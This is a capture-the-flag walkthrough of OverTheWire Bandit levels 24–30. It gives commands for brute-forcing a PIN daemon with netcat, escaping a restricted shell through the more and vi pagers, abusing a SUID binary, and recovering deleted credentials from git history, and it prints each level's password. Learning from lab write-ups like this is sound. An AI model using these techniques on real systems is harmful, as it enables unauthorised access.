## Level 24 → Level 25
* **Objective:** Brute-force a local daemon listening on port `30002` that expects the `bandit24` password followed by a space and a 4-digit PIN (`0000`–`9999`) to reveal the `bandit25` password.
* **Commands:**
  ```bash
  for pin in {0000..9999}; do
      echo "$bandit24 $pin"
  done | nc localhost 30002
  ```
* **Key Concept:** Streaming all 10,000 zero-padded PIN combinations (`{0000..9999}`) through a single Netcat (`nc`) TCP connection avoids the overhead of opening 10,000 separate connections.
* **Password:** `SoHfqNOEqIX2IYKVcIZxvgpR9a2Djx4P` (or `<REDACTED>` for public GitHub)

---

## Level 25 → Level 26
* **Objective:** Transfer `bandit26.sshkey` to the local machine (since SSH connections from `localhost` are blocked), bypass `bandit26`'s restricted login shell (`/usr/bin/showtext`), and escape from the `more` pager into `vi` to spawn an interactive Bash shell.
* **Commands:**
  ```bash
  # 1. Copy the SSH private key from bandit25 to local Kali machine over IPv4
  scp -4 -P 2220 bandit25@bandit.labs.overthewire.org:bandit26.sshkey ~/bandit26.key
  chmod 600 ~/bandit26.key

  # 2. Shrink terminal window height to 4–5 lines so `more` pauses at --More--(16%)
  ssh -4 -i ~/bandit26.key bandit26@bandit.labs.overthewire.org -p 2220

  # 3. Inside --More--: press `v` to open `vi`, then run:
  :set shell=/bin/bash
  :shell

  # 4. Inside the spawned bandit26 Bash shell:
  cat /etc/bandit_pass/bandit26
  ```
* **Key Concept:** When a restricted shell invokes `more` to display a banner, shrinking the terminal window forces `more` to pause instead of exiting immediately. Pressing `v` opens the file in `vi`, where `:set shell=/bin/bash` and `:shell` break out into a standard Bash shell.
* **Password:** `jHdv2ELQhT22BkprNNDjybZDAkw1zeBJ` (or `<REDACTED>` for public GitHub)

---

## Level 26 → Level 27
* **Objective:** From inside the `bandit26` shell, use the SUID binary (`bandit27-do`) in the home directory to execute a command as `bandit27` and read `/etc/bandit_pass/bandit27`.
* **Commands:**
  ```bash
  ls -la
  ./bandit27-do cat /etc/bandit_pass/bandit27
  ```
* **Key Concept:** The `bandit27-do` binary has the SUID (`s`) permission bit set and is owned by `bandit27`, executing passed command arguments with `bandit27`'s privileges.
* **Password:** `STJLJBRRphMxKB392CT4i0r5CbzPU9ER` (or `<REDACTED>` for public GitHub)

---

## Level 27 → Level 28
* **Objective:** Clone the `bandit27-git` repository over SSH from a local client machine (bypassing the server's `localhost` SSH restriction) and read the `README` file.
* **Commands:**
  ```bash
  GIT_SSH_COMMAND="ssh -4 -p 2220" git clone ssh://bandit27-git@bandit.labs.overthewire.org/home/bandit27-git/repo
  cd repo && ls -al && cat README
  ```
* **Key Concept:** OverTheWire blocks SSH connections originating from `localhost` (`127.0.0.1`). Setting `GIT_SSH_COMMAND="ssh -4 -p 2220"` instructs `git clone` to connect directly from the Kali VM over IPv4 on port `2220`.
* **Password:** `yBYd2ssKcpHpud7UvO5OxwamRMzIGIeQ` (or `<REDACTED>` for public GitHub)

---

## Level 28 → Level 29
* **Objective:** Clone the `bandit28-git` repository and inspect its Git commit history to recover the `bandit29` password that was committed and subsequently deleted.
* **Commands:**
  ```bash
  mkdir bandit28
  cd bandit28
  GIT_SSH_COMMAND="ssh -4 -p 2220" git clone ssh://bandit28-git@bandit.labs.overthewire.org/home/bandit28-git/repo
  cd repo
  git log -p
  ```
* **Key Concept:** Deleting sensitive data in a newer Git commit does not erase it from repository history; `git log -p` displays full patch diffs for every commit, exposing the previously removed credentials.
* **Password:** `En7eGtqaWySwNFjCpwzzHhLhospOcdt0` (or `<REDACTED>` for public GitHub)

---

## Level 29 → Level 30
* **Objective:** Clone the `bandit29-git` repository, enumerate remote branches, and check out the `dev` branch to find the password omitted from `master`.
* **Commands:**
  ```bash
  mkdir bandit29
  cd bandit29
  GIT_SSH_COMMAND="ssh -4 -p 2220" git clone ssh://bandit29-git@bandit.labs.overthewire.org/home/bandit29-git/repo
  cd repo
  cat README.md
  git branch -a
  git checkout dev
  cat README.md
  ```
* **Key Concept:** `git clone` only checks out the default branch (`master`) locally. Running `git branch -a` reveals hidden remote branches (`remotes/origin/dev`), which can be inspected using `git checkout dev`.
* **Password:** `jq9Dfg2rXsfYsWWgFuKlXhphjdH7USgX` (or `<REDACTED>` for public GitHub)
*
